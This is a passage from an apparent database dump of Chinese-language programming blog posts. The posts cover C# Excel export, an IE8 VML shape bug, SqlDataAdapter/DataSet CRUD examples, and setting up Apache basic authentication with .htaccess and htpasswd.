/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objSheet.Cells[1,2] = &quot;中文測試二&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objSheet.Cells[1,3] = &quot;中文測試三&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objSheet.Cells[1,4] = &quot;中文測試四&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objSheet.Cells[1,5] = &quot;中文測試五&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objRange = m_objSheet.get_Range(&quot;A2&quot;, m_objOpt);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objQryTable = m_objSheet.QueryTables.Add(&quot;OLEDB;Provider=SQLOLEDB.1;&quot; + strConnect, m_objRange, strQuery);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objQryTable.RefreshStyle = Excel.XlCellInsertionMode.xlInsertEntireRows;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objQryTable.FieldNames = false;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objQryTable.Refresh(false);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void button1_Click(object sender, EventArgs e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DeclareExcelApp();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SaveExcelApp();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }<br />\r\n}<br />\r\n在本篇中﹐是將13萬多條記錄分多個Sheet導出。如果你的機器大概像我這樣:P4CPU,1G內存的話。全部導出包括保存也就是20秒左右就可以全部搞定。<br />\r\n也許大家會有更好的方法來實現﹐歡迎各位交流﹗</p>\r\n',0,1438328609,0,0),(144,1,'js创建shape标签的问题','<p>&lt;!DOCTYPE html&gt;</p>\r\n\r\n<p>&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</p>\r\n\r\n<p>&lt;head&gt;</p>\r\n\r\n<p>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</p>\r\n\r\n<p>&lt;title&gt;无标题文档&lt;/title&gt;</p>\r\n\r\n<p>&lt;/head&gt;</p>\r\n\r\n<p>&lt;style type=&quot;text/css&quot;&gt;</p>\r\n\r\n<p>&lt;/style&gt;</p>\r\n\r\n<p>&lt;body&gt;</p>\r\n\r\n<p>&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;</p>\r\n\r\n<p>window.onload = function(){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var doc = document;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var cont = doc.getElementById(&#39;xx&#39;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var sharp = doc.createElement(&#39;shape&#39;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sharp.coordsize=&#39;100 100&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sharp.path=&#39;wa 1995 1995 3995 3995 3995 2995 3995 2995 e&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sharp.xmlns=&quot;urn:schemas-microsoft-com:vml&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sharp.style.position = &#39;absolute&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sharp.style.width = &#39;10px&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sharp.style.display= &#39;inline-block&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sharp.style.height= &#39;10px&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sharp.style.top= &#39;1px&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sharp.style.behavior=&#39;url(#default#VML); LEFT: 1px;&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cont.appendChild(sharp);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cont.appendChild(sharp.cloneNode(true));</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var line = doc.createElement(&#39;shape&#39;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; line.coordsize=&#39;100 100&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; line.path=&#39;M 0 0 L 500 10 L 500 500 L 300 500 x&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; line.strokeweight = 5;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; line.filled = true;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; line.fillcolor = &#39;red&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; line.style.position = &#39;absolute&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; line.style.width = &#39;10px&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; line.style.display= &#39;inline-block&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; line.style.height= &#39;10px&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; line.style.top= &#39;1px&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; line.style.behavior=&#39;url(#default#VML); LEFT: 1px;&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; line.xmlns=&quot;urn:schemas-microsoft-com:vml&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cont.appendChild(line);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&lt;/script&gt;</p>\r\n\r\n<p>&lt;div id=&#39;xx&#39;&gt;&lt;/div&gt;</p>\r\n\r\n<p>&lt;/body&gt;</p>\r\n\r\n<p>&lt;/html&gt;</p>\r\n\r\n<p>第2次创建的就看不见了<br />\r\n不知道为什么！～～～～～～～～～～～？？</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>看了司徒正美的一篇文章<br />\r\n应该算是ie8的bug<br />\r\n地址<br />\r\nhttp://www.cnblogs.com/rubylouvre/archive/2009/10/12/1581891.html<br />\r\n用createElement&nbsp; 写个长字符串 把参数放里面就好了<br />\r\n杯具...........</p>\r\n',0,1438328776,0,0),(145,38,'C# SqlDataAdapter与DataSet的使用','<p>查询所有：</p>\r\n\r\n<p>SqlConnection conn = new SqlConnection(&quot;server=(local);database=northwind;uid=sa;pwd=sasasa&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlDataAdapter adapter = new SqlDataAdapter(&quot;select * from Customers&quot;, conn);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;填充前：&quot;+conn.State.ToString());<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataSet ds = new DataSet();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.Fill(ds, &quot;s&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;填充后：&quot; + conn.State.ToString());<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach (DataRow dr in ds.Tables[&quot;s&quot;].Rows)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(dr[&quot;CustomerID&quot;] + &quot;\\t&quot; + dr[&quot;CompanyName&quot;]);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>这个程序里面，SqlConnection并没有显式的打开或关闭，因为SqlDataAdapter自动完成了这个工作，数据授权对象会在需要的时候打开连接，在完成工作后关闭它，注意：SqlDataAdapter延续SqlConnection的状态，即：原来SqlConnection是打开的，则执行完后，仍是打开的，SqlConnection原来是关闭的，则执行完成后仍然是关闭的。上例中，输出的 SqlConnection的State均是Closed。</p>\r\n\r\n<p>--------------------------------------------------------------------------------------------------------------</p>\r\n\r\n<p>修改</p>\r\n\r\n<p>SqlConnection conn = new SqlConnection(&quot;server=(local);database=northwind;uid=sa;pwd=sasasa&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlDataAdapter adapter = new SqlDataAdapter(&quot;select Companyname from customers&quot;, conn);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlCommandBuilder builder = new SqlCommandBuilder(adapter);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataSet ds = new DataSet();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.Fill(ds,&quot;cus&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(ds.Tables[&quot;cus&quot;].Rows[9][&quot;Companyname&quot;]);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ds.Tables[&quot;cus&quot;].Rows[9][&quot;Companyname&quot;] = &quot;aaaaaaaaaaaaaaaaaaaaa&quot;;//在这句执行以后，直接运行Console.WriteLine的话，发现已经增加了一行了，但是真正的查询数据库的时候发现并未增加，原因是：ds中的数据表现的是内存中的数据，而内存中的数据是对应数据库中的表的，任何对ds的修改都只是对内存数据进行修改，必须使用adapter.Update(ds, &quot;cus&quot;)，此句将内存数据更新至磁盘上数据库中的表<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.Update(ds, &quot;cus&quot;);//非常重要，必不可少<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(ds.Tables[&quot;cus&quot;].Rows[9][&quot;Companyname&quot;]);</p>\r\n\r\n<p>有了SqlCommandBuilder，将SqlDataAdapter传递之后，自动生成SQL命令，并将其与传递进来的DataAdapter关联。</p>\r\n\r\n<p>注意：此时在内存中的DataSet只有Companyname一列，此时如果想要进行如下操作，则会报错，ds.Tables[&quot;cus&quot;].Rows[9][&quot;CustomerID&quot;]=&quot;sfdsa&quot;，原因是内存中的表没有CustomerID这一列，如果要进行此项修改，必须修改前面的Select语句：select Companyname,CustomerID from customers或者select * from customers，但是后面一种占用较大内存。</p>\r\n\r\n<p>----------------------------------------------------------------------------------------------------------</p>\r\n\r\n<p>增加：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlConnection conn = new SqlConnection(&quot;server=(local);database=northwind;uid=sa;pwd=sasasa&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlDataAdapter adapter = new SqlDataAdapter(&quot;select * from customers&quot;, conn);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlCommandBuilder builder = new SqlCommandBuilder(adapter);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataSet ds = new DataSet();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.Fill(ds, &quot;cus&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(ds.Tables[&quot;cus&quot;].Rows.Count);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataRow dr = ds.Tables[&quot;cus&quot;].NewRow();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dr[&quot;customerid&quot;] = &quot;edf&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dr[&quot;companyname&quot;] = &quot;adsfas&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ds.Tables[&quot;cus&quot;].Rows.Add(dr);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.Update(ds, &quot;cus&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(ds.Tables[&quot;cus&quot;].Rows.Count);</p>\r\n\r\n<p>---------------------------------------------------------------------------------------------------------</p>\r\n\r\n<p>查询指定的行：</p>\r\n\r\n<p>SqlConnection conn = new SqlConnection(&quot;server=(local);database=northwind;uid=sa;pwd=sasasa&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlDataAdapter adapter = new SqlDataAdapter(&quot;select * from customers&quot;, conn);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlCommandBuilder builder = new SqlCommandBuilder(adapter);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataSet ds = new DataSet();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.Fill(ds, &quot;cus&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(ds.Tables[&quot;cus&quot;].Rows.Count);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataColumn[] dc = new DataColumn[1];<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dc[0] = ds.Tables[&quot;cus&quot;].Columns[&quot;customerid&quot;];<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ds.Tables[&quot;cus&quot;].PrimaryKey = dc;//设置主键<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataRow dr = ds.Tables[&quot;cus&quot;].Rows.Find(&quot;edf1&quot;);//获取主键<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (dr == null)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;没有被找到，需要被添加&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataRow addrow = ds.Tables[&quot;cus&quot;].NewRow();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addrow[&quot;customerid&quot;] = &quot;edf1&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addrow[&quot;companyname&quot;] = &quot;fdsadsf&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ds.Tables[&quot;cus&quot;].Rows.Add(addrow);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;已经被找到&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.Update(ds, &quot;cus&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(ds.Tables[&quot;cus&quot;].Rows.Count);</p>\r\n\r\n<p>--------------------------------------------------------------------------------------------------------</p>\r\n\r\n<p>删除：</p>\r\n\r\n<p>SqlConnection conn = new SqlConnection(&quot;server=(local);database=northwind;uid=sa;pwd=sasasa&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlDataAdapter adapter = new SqlDataAdapter(&quot;select * from customers&quot;, conn);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlCommandBuilder builder = new SqlCommandBuilder(adapter);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataSet ds = new DataSet();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.Fill(ds, &quot;cus&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataColumn[] key = new DataColumn[1];<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; key[0] = ds.Tables[&quot;cus&quot;].Columns[&quot;customerid&quot;];<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ds.Tables[&quot;cus&quot;].PrimaryKey = key;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataRow dr = ds.Tables[&quot;cus&quot;].Rows.Find(&quot;edf1&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (dr == null)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;没有被找到，需要被添加&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;已经被找到,需要被删除&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dr.Delete();//此处紧紧标识要被删除的行，真正执行删除语句的是下面的adapter.update(ds,&quot;cus&quot;);此处的删除仅对内存中的数据进行修改<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.Update(ds, &quot;cus&quot;);</p>\r\n',0,1438328860,0,0),(146,46,'apache用户名和密码验证','<p>Apache服务器已经内置用户验证机制，大家只要适当的加以设置，便可以控制网站的某些部分要用户验证。<br />\r\n前期准备，必须已经安装apache，如果还没安装，或者对安装很模糊的话，<br />\r\n第1步：<br />\r\n我们在/var/www(apache的主页根目录)下建立一个test目录<br />\r\nmkdir /var/www/test<br />\r\n第2步<br />\r\n然后我们编辑httpd.conf<br />\r\n添加<br />\r\nAlias /test&quot;/var/www/test&quot;<br />\r\nOptions Indexes MultiViews<br />\r\nAllowOverride AuthConfig #表示进行身份验证<br />\r\nOrder allow,deny<br />\r\nAllow from all</p>\r\n\r\n<p>#AllowOverride AuthConfig 表示进行身份验证这是关键的设置<br />\r\n第3步<br />\r\n在/var/www/test创建.htaccess文件<br />\r\nvi /var/www/test/.htaccess<br />\r\nAuthName &quot;frank share web&quot;<br />\r\nAuthType Basic<br />\r\nAuthUserFile /var/www/test/.htpasswd<br />\r\nrequire valid-user<br />\r\n#AuthName 描述，随便写<br />\r\n#AuthUserFile /var/www/test/.htpasswd<br />\r\n#require valid-user 或者 require user frank 限制是所有合法用户还是指定用户<br />\r\n#密码文件推荐使用.htpasswd,因为apache默认系统对&ldquo;.ht&rdquo;开头的文件默认不允许外部读取，安全系数会高一点哦。<br />\r\n第4步<br />\r\n就是创建apache的验证用户<br />\r\nhtpasswd -c /var/www/test/.htpasswd frank<br />\r\n#第一次创建用户要用到-c 参数 第2次添加用户，就不用-c参数<br />\r\n如果你们想修改密码，可以如下<br />\r\nhtpasswd -m .htpasswd frank<br />\r\n第5步：<br />\r\nok，重启apache服务，然后访问 http://你的网站地址/test 如果顺利的话，应该能看到一个用户验证的弹出窗口，只要填入第4步创建的用户名和密码就行<br />\r\n后话，为了服务器的性能，一般不推荐使用AllowOverride AuthConfig或者AllowOverride ALL，因为这会使服务器会不断的去寻找.htaccess,从而影响服务器的效能，一般我们把一些后台管理界面或者其他特殊目录可能需要加验证这个需求。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><br />\r\n经常上网的读者会遇到这种情况：访问一些网站的某些资源时，浏览器弹出一个对话框，要求输入用户名和密码来获取对资源的访问。这就是用户认证的一种技术。用户认证是保护网络系统资源的第一道防线，它控制着所有登录并检查访问用户的合法性，其目标是仅让合法用户以合法的权限访问网络系统的资源。基本的用户认证技术是&ldquo;用户名＋密码&rdquo;。</p>\r\n\r\n<p>Apache是目前流行的Web服务器，可运行在Linux、Unix、Windows等操作系统下，它可以很好地解决&ldquo;用户名＋密码&rdquo;的认证问题。Apache用户认证所需要的用户名和密码有两种不同的存贮方式：一种是文本文件；另一种是MSQL、Oracle、MySQL等数据库。下面以Linux的Apache为例，就这两种存贮方式，分别介绍如何实现用户认证功能，同时对Windows的Apache用户认证作简要的说明。<br />\r\n采用文本文件存储<br />\r\n这种认证方式的基本思想是：Apache启动认证功能后，就可以在需要限制访问的目录下建立一个名为.htaccess的文件，指定认证的配置命令。当用户第一次访问该目录的文件时，浏览器会显示一个对话框，要求输入用户名和密码，进行用户身份的确认。若是合法用户，则显示所访问的页面内容，此后访问该目录的每个页面，浏览器自动送出用户名和密码，不用再输入了，直到关闭浏览器为止。以下是实现的具体步骤：<br />\r\n以超级用户root进入Linux，假设Apache 1.3.12已经编译、安装到了/usr/local/apache目录中。缺省情况下，编译Apache时自动加入mod_auth模块，利用此模块可以实现&ldquo;用户名+密码&rdquo;以文本文件为存储方式的认证功能。<br />\r\n1.修改Apache的配置文件/usr/local/apache/conf/httpd.conf，对认证资源所在的目录设定配置命令。下例是对/usr/local/apache/htdocs/members目录的配置：<br />\r\n＜Directory /usr/local/apache/htdocs /members＞<br />\r\nOptions Indexes FollowSymLinks<br />\r\nallowoverride authconfig<br 